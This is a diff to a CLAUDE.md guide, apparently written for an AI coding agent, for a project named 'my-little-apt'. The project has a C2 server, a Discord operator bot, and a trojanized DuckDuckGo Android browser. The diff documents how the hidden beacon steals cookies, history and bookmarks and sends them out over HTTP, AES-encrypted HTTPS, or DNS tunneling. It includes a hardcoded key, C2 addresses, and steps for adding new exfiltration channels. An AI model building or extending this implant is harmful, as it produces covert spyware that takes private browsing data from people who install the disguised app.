@@ -26,43 +26,50 @@ my-little-apt/
 │   ├── requirements.txt      # Runtime deps (discord.py, httpx)
 │   ├── requirements-dev.txt  # Dev deps (pytest, pytest-asyncio, mypy, bandit)
 │   └── tests/
-│       ├── test_bot.py       # 49 tests — slash commands, access control, autocomplete
+│       ├── test_bot.py       # 56 tests — slash commands, access control, autocomplete, results
 │       ├── test_config.py    # 14 tests — config constant validation
-│       └── test_devices.py   # 46 tests — DeviceManager logic
+│       └── test_devices.py   # 46 tests — DeviceManager logic (standalone mode)
 │
 ├── server/                   # Python — FastAPI C2 server
-│   ├── server.py             # Entry point: FastAPI app with admin + beacon endpoints
-│   ├── command_handler.py    # CommandHandler class — device registry + per-device task queue
+│   ├── server.py             # Entry point: FastAPI app + lifespan DNS startup
+│   ├── command_handler.py    # CommandHandler — devices, task queue, result storage
+│   ├── crypto.py             # AES-256-CBC encrypt/decrypt for HTTPS channel
+│   ├── dns_server.py         # dnslib DNS exfiltration listener (UDP)
 │   ├── models.py             # Pydantic models (BeaconCheckIn, ServerConfig, TaskResponse, etc.)
 │   ├── config.py             # REAL config (gitignored)
-│   ├── config-example.py     # Template
-│   ├── requirements.txt
-│   ├── requirements-dev.txt
+│   ├── config-example.py     # Template (includes AES_SECRET_KEY, DNS_LISTENER_PORT)
+│   ├── requirements.txt      # Runtime deps (fastapi, pycryptodome, dnslib, ...)
+│   ├── requirements-dev.txt  # Dev deps
 │   └── tests/
-│       ├── test_server.py         # 67 tests — API endpoint tests
-│       └── test_command_handler.py # 22 tests — state + task queue tests
+│       ├── test_server.py         # 78 tests — API endpoint tests (incl. /admin/results)
+│       ├── test_command_handler.py # 27 tests — state, task queue, result storage
+│       └── test_models.py         # model validation tests
 │
 ├── trojan-ddg/               # Kotlin — Modified DuckDuckGo Android browser
 │   └── trojan/               # C2 beacon module (follows DDG's API/impl pattern)
 │       ├── trojan-api/       # Interface contracts (published to other modules)
 │       │   └── src/main/java/com/duckduckgo/trojan/api/
-│       │       ├── BeaconService.kt   # interface BeaconService { checkIn(), sendResult() }
+│       │       ├── BeaconService.kt   # interface BeaconService { checkIn(), sendResult(..., protocol) }
 │       │       └── PendingCommand.kt  # data class PendingCommand(id, type, payload: Map)
 │       │
 │       └── trojan-impl/      # Implementation (Dagger-wired, never imported directly)
 │           ├── src/main/java/com/duckduckgo/trojan/impl/
 │           │   ├── C2ApiService.kt      # Retrofit interface matching server endpoints
-│           │   ├── C2NetworkModule.kt   # @Named("c2") OkHttp + Retrofit (isolated stack)
-│           │   ├── RealBeaconService.kt # Implements BeaconService (check-in + poll + result)
+│           │   ├── C2NetworkModule.kt   # @Named("c2") OkHttp + Retrofit + shared constants
+│           │   ├── RealBeaconService.kt # check-in + poll + protocol-aware sendResult
+│           │   ├── AesExfiltrator.kt    # AES-256-CBC encryption for HTTPS channel
+│           │   ├── DnsExfiltrator.kt    # DNS tunneling exfiltration (raw DatagramSocket)
 │           │   ├── CommandHandler.kt    # Dispatches request-cookies/history/bookmarks
 │           │   └── BeaconWorker.kt      # OneTimeWorkRequest chain + BeaconInitializer
 │           │
 │           └── src/test/java/com/duckduckgo/trojan/impl/
-│               ├── BeaconWorkerTest.kt       # 10 tests (Robolectric)
+│               ├── BeaconWorkerTest.kt       # 11 tests (Robolectric)
 │               ├── CommandHandlerTest.kt     # 9 tests (Robolectric)
-│               └── RealBeaconServiceTest.kt  # 7 tests (mockito)
+│               ├── RealBeaconServiceTest.kt  # 14 tests (mockito)
+│               ├── AesExfiltratorTest.kt     # 5 tests — encryption correctness
+│               └── DnsExfiltratorTest.kt     # 5 tests — chunking and QNAME format
 │
-├── .github/workflows/        # CI/CD pipelines (one per component)
+├── .github/workflows/        # CI/CD pipelines (trigger on main, feat/**, fix/**)
 ├── README.md                 # User-facing deployment guide
 └── CLAUDE.md                 # This file
 ```
@@ -103,6 +110,7 @@ Understanding this cycle is critical. Every feature touches at least two modules
 - **Dynamic beacon interval:** The server returns `beacon_interval` in check-in and task responses. The client uses `OneTimeWorkRequest` chaining (not `PeriodicWorkRequest`) so intervals can be as short as 15 seconds.
 - **Isolated networking:** The trojan's OkHttp/Retrofit stack is `@Named("c2")` — completely separated from DDG's own networking to prevent traffic leaks.
 - **API/impl split:** The trojan follows DDG's module pattern: `trojan-api` defines interfaces, `trojan-impl` provides Dagger-wired implementations. Other DDG modules only see `trojan-api`.
+- **Two-channel design:** Check-in and task polling always use HTTP (command channel). Only result submission uses the configurable protocol (exfiltration channel). This mirrors real APT behavior and keeps the beacon stable regardless of the chosen exfiltration method.
 
 ---
 
@@ -154,33 +162,50 @@ VALID_COMMUNICATION_PROTOCOLS = ["http", "https", "dns"]
 **State:** In-memory (no database) — `CommandHandler` singleton holds all state
 
 #### Architecture
-- `server.py` defines all FastAPI routes. Two groups: `/admin/*` (bot-facing) and `/beacon/*` (client-facing).
-- `command_handler.py` contains `CommandHandler` — a class that manages the device registry, server config, and per-device task queues.
+- `server.py` defines all FastAPI routes and uses a FastAPI lifespan context to start the DNS listener on startup.
+- `command_handler.py` contains `CommandHandler` — manages devices, config, task queues, task registry, and results.
+- `crypto.py` provides AES-256-CBC `encrypt()`/`decrypt()` for the HTTPS exfiltration channel.
+- `dns_server.py` contains the `dnslib`-based DNS listener that reassembles chunked DNS queries into result payloads.
 - `models.py` defines Pydantic models for request/response validation.
 
-#### Task Queue
+#### Task Queue + Result Storage
 ```python
 # command_handler.py
 class CommandHandler:
-    devices: dict[str, DeviceInfo]          # name -> device info
-    server_config: ServerConfig             # beacon_interval, protocol
-    task_queues: dict[str, list[TaskResponse]]  # device_name -> [tasks]
+    devices: dict[str, DeviceInfo]               # name -> device info (includes .results)
+    server_config: ServerConfig                  # beacon_interval=15, protocol="http"
+    task_queues: dict[str, list[TaskResponse]]   # device_name -> [tasks]
+    task_registry: dict[str, str]                # task_id -> task_type (for result lookup)
 ```
-- `queue_task(device_name, task_type, params)` adds to the queue.
+- `queue_task(device_name, task_type, params)` adds to queue AND registers `task_id → task_type`.
 - `queue_task_for_all(task_type, params)` adds to ALL registered devices.
-- `dequeue_tasks(device_name)` returns and removes all tasks for that device.
+- `dequeue_tasks(device_name)` returns and removes all tasks for that device (fire-once).
+- `store_result(task_id, device_name, data, success)` looks up `task_type` from registry, persists in `device.results[task_type]`, removes from registry.
 
 #### Endpoint Flow
 ```
-POST /admin/queue-task → handler.queue_task() → stored in task_queues
-GET  /beacon/tasks/{name} → handler.dequeue_tasks() → tasks returned and removed
-POST /beacon/result → handler.store_result() → results stored
+POST /admin/queue-task  → handler.queue_task()    → stored in task_queues + task_registry
+GET  /beacon/tasks/{n}  → handler.dequeue_tasks() → tasks returned and removed
+POST /beacon/result     → handler.store_result()  → latest result stored per task_type on device
+GET  /admin/results     → reads device.results    → returns per-device, per-task-type results
+```
+
+#### Exfiltration Protocols (POST /beacon/result)
+- `http`: receives plain `TaskResult` JSON, calls `store_result()` directly.
+- `https`: `TaskResult.encrypted=True` triggers `crypto.decrypt(data["output"])` before storing.
+- `dns`: result never arrives via HTTP — it arrives via UDP DNS queries handled by `dns_server.py`, which calls `store_result()` after reassembly.
+
+#### Config Keys (config-example.py)
+```python
+AES_SECRET_KEY: str = "c2k3y1234567890cabcdef1234567890"  # 32 bytes — must match Android
+DNS_LISTENER_PORT: int = 5300  # use 53 for real DNS (requires root/setcap)
 ```
 
 #### Testing
 - Tests use `pytest` + `httpx.AsyncClient` with `ASGITransport(app)`.
-- Each test class resets `handler.task_queues` via a fixture.
-- All 67 tests cover: check-in, device listing, cookies, intervals, protocol, task queue lifecycle.
+- `reset_handler` fixture clears `devices`, `task_queues`, `task_registry`, re-seeds sample devices.
+- Server starts empty (no `_seed_sample_devices()` in `__init__`); seeding is explicit in tests.
+- 78 tests cover: check-in, device listing, cookies, results, intervals, protocol, task queue lifecycle.
 
 ### Trojan Client (`trojan-ddg/trojan/`)
 
@@ -198,15 +223,17 @@ POST /beacon/result → handler.store_result() → results stored
 
 | Class | Role |
 |---|---|
-| `BeaconService` | Interface: `checkIn(): CheckInResult`, `sendResult(id, data)` |
-| `CheckInResult` | Data class: `commands: List<PendingCommand>`, `beaconInterval: Int` |
+| `BeaconService` | Interface: `checkIn(): CheckInResult`, `sendResult(id, type, result, protocol)` |
+| `CheckInResult` | Data class: `commands`, `beaconInterval`, `communicationProtocol: String = "http"` |
 | `PendingCommand` | Data class: `id: String`, `type: String`, `payload: Map<String, Any>` |
-| `RealBeaconService` | Implementation: POST check-in → GET tasks → returns CheckInResult |
+| `RealBeaconService` | check-in + poll + protocol-aware `sendResult` dispatch (http/https/dns) |
+| `AesExfiltrator` | `object`: AES-256-CBC `encrypt(plaintext, key)` → base64(IV\|\|ciphertext) |
+| `DnsExfiltrator` | base64-chunks result into DNS A-queries via raw `DatagramSocket` to C2_DNS_PORT |
 | `CommandHandler` | Interface + `RealCommandHandler`: dispatches `request-cookies`, `request-history`, `request-bookmarks` |
-| `BeaconWorker` | `CoroutineWorker`: calls `checkIn()`, executes commands, sends results, schedules next run |
+| `BeaconWorker` | `CoroutineWorker`: `checkIn()` → execute commands → `sendResult(..., protocol)` → scheduleNext |
 | `BeaconInitializer` | `MainProcessLifecycleObserver`: enqueues first `OneTimeWorkRequest` on app start |
 | `C2ApiService` | Retrofit interface matching server `/beacon/*` endpoints |
-| `C2NetworkModule` | Dagger module: provides `@Named("c2")` OkHttp + Retrofit + C2ApiService |
+| `C2NetworkModule` | Dagger module: `@Named("c2")` OkHttp + Retrofit + shared constants (IP, ports, AES key) |
 
 #### Beacon Self-Rescheduling Chain
 ```
@@ -214,11 +241,22 @@ App start → BeaconInitializer.onCreate()
   └→ enqueueUniqueWork("c2_beacon", KEEP, OneTimeWorkRequest(delay=15s))
 
 BeaconWorker.doWork()
-  ├→ checkIn() → CheckInResult(commands=[...], beaconInterval=60)
-  ├→ execute each command
-  ├→ sendResult() for each
+  ├→ checkIn() → CheckInResult(commands=[...], beaconInterval=60, communicationProtocol="https")
+  ├→ execute each command via CommandHandler
+  ├→ sendResult(id, type, result, protocol="https") for each
+  │     "http"  → POST /beacon/result (plain JSON)
+  │     "https" → AesExfiltrator.encrypt() → POST /beacon/result (encrypted)
+  │     "dns"   → DnsExfiltrator.exfiltrate() → UDP DNS queries to C2_DNS_PORT
   └→ scheduleNext(60) → enqueueUniqueWork("c2_beacon", REPLACE, OneTimeWorkRequest(delay=60s))
        └→ doWork() fires again after 60s ...
+```
+
+#### Shared Constants (C2NetworkModule.kt)
+```kotlin
+C2_SERVER_IP = "192.168.0.204"    // change before building APK
+C2_HTTP_PORT = 8000
+C2_DNS_PORT  = 5300               // must match server/config.py DNS_LISTENER_PORT
+AES_KEY      = "c2k3y1234567890cabcdef1234567890"  // must match server/config.py AES_SECRET_KEY
 ```
 
 #### Important: JAVA_HOME
@@ -238,13 +276,13 @@ JAVA_HOME=~/.local/share/JetBrains/Toolbox/apps/android-studio/jbr
 ## How to Run Tests
 
 ```bash
-# Server (67 tests)
+# Server (78 tests)
 cd server && python -m pytest tests/ -v
 
-# Discord Bot (109 tests)
+# Discord Bot (121 tests)
 cd discord-bot && python -m pytest tests/ -v
 
-# Android Client (26 tests)
+# Android Client (36 tests)
 cd trojan-ddg && JAVA_HOME=~/.local/share/JetBrains/Toolbox/apps/android-studio/jbr \
   ./gradlew :trojan-impl:testDebugUnitTest
 ```
@@ -275,6 +313,11 @@ When adding a new command (e.g., `request-autofill`):
 3. **Client:** Add a handler branch in `CommandHandler.kt`'s `when` block.
 4. **Tests:** Add tests in all affected modules.
 
+When adding a new exfiltration protocol:
+1. **Server:** Add decrypt/receive logic in `server.py` or `dns_server.py`; handle in `store_result()`.
+2. **Android:** Add a new `*Exfiltrator.kt`; add a `when` branch in `RealBeaconService.sendResult()`.
+3. **Config:** Add the new protocol name to `VALID_COMMUNICATION_PROTOCOLS` in both `config-example.py` files.
+
 ---
 
 ## Config Files
@@ -283,7 +326,7 @@ When adding a new command (e.g., `request-autofill`):
 
 | File | Template | Contains |
 |---|---|---|
-| `server/config.py` | `config-example.py` | `SERVER_HOST`, `SERVER_PORT`, `VALID_BEACON_INTERVALS` |
+| `server/config.py` | `config-example.py` | `SERVER_HOST`, `SERVER_PORT`, `VALID_BEACON_INTERVALS`, `AES_SECRET_KEY`, `DNS_LISTENER_PORT` |
 | `discord-bot/config.py` | `config-example.py` | `DISCORD_BOT_TOKEN`, `ADMIN_DISCORD_ID`, `C2_SERVER_URL` |
 
 The C2 server URL in the Android client is hardcoded in:
@@ -313,3 +356,7 @@ Each component has its own GitHub Actions workflow triggered by `paths` filters:
 4. **WorkManager minimum intervals:** Android's `PeriodicWorkRequest` has a 15-minute minimum. That's why we use `OneTimeWorkRequest` chains instead.
 5. **Network isolation:** The C2 Retrofit client uses `@Named("c2")` — do NOT merge it with DDG's default HTTP client.
 6. **Fire-once tasks:** Tasks are removed from the server queue when polled. There is no "re-queue" mechanism — if the client crashes mid-execution, the task is lost.
+7. **AES key length:** `AES_SECRET_KEY` must be exactly 32 bytes (256-bit). Shorter keys cause a `InvalidKeyException` at runtime on both server and Android.
+8. **DNS port requires root:** `DNS_LISTENER_PORT=53` requires `sudo` or `setcap cap_net_bind_service`. Use `5300` for local dev. The Android `C2_DNS_PORT` must match.
+9. **Server starts empty:** `CommandHandler.__init__` no longer seeds sample devices. `_seed_sample_devices()` exists only for test fixtures — call it explicitly where needed.
+10. **Protocol is exfiltration-only:** `communication_protocol` controls only `sendResult()`. Check-in and task polling always use HTTP regardless of the configured protocol.
